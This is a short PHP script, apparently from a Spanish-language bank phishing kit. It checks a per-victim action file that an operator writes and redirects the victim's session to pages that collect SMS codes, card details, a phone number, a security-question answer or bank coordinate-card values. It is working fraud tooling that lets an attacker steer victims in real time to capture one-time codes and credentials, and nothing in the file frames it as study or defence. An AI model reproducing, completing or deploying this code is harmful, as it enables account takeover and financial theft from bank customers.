<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['usuario'])) exit;

$usuario = $_SESSION['usuario'];
$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
        $_SESSION['pregunta'] = explode("/palabra clave/", $accion)[1];
        header("Location: pregunta.php");
        exit;
    }

    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
        $_SESSION['etiquetas'] = explode(",", explode("/coordenadas etiquetas/", $accion)[1]);
        header("Location: coordenadas.php");
        exit;
    }

    switch ($accion) {
        case "/SMS":
            header("Location: sms.php");
            break;
        case "/SMS2":
            header("Location: sms2.php");
            break;
        case "/LOGIN":
            header("Location: index.php");
            break;
        case "/SMSERROR":
            header("Location: smserror.php");
            break;
        case "/NUMERO":
            header("Location: numero.php");
            break;
        case "/CARD":
            header("Location: tarjeta.php");
            break;
        case "/ERROR":
            header("Location: index2.php");
            break;
    }

    exit;
}
?>
